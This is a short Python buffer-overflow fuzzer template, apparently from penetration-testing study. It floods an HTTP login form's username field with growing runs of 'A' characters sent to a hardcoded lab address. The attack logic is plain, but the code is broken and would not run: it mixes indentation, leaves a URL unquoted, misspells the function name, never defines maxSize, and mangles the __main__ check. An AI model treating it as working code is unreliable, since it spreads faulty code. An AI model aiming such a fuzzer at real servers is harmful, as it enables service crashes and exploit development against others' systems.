import socket
import time
import sys

# Generation based fuzzer template
# Use with packet capture to monitor the success

def sendBoF(target, host, loginUrl, size, maxSize):
    while(size < maxSize):
        try:
            print(f"Sending buffer of {str(size)} bytes to {target}")
            inputBuffer = "A" * size
            content = f"username={inputBuffer}&password=A" 
            
            buffer = "POST /login HTTP/1.1\r\n"
            buffer += f"Host: {host} \r\n" # IP or Vhost would go here
            buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
            buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            buffer += "Accept-Language: en-US,en;q=0.5\r\n"
            buffer += f"Referer: {loginUrl}\r\n"
            buffer += "Connection: close\r\n"
            buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
            buffer += f"Content-Length: {str(len(content))}\r\n"
            buffer += "\r\n"
            buffer += content

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, 80))
            s.send(buffer)
            s.close()
            print(f"Connected to {target}")

            size += 100
            time.sleep(10)
        except:
            print(f"Could not connect to {target}")
            sys.exit()



def main():
    target = "10.10.10.10"
	host = target # Change if required
	loginUrl = http://10.11.0.22/login
	size = 100
    sendBof(target, host, loginUrl, size,  maxSize)


if name == '__main__':
    main()
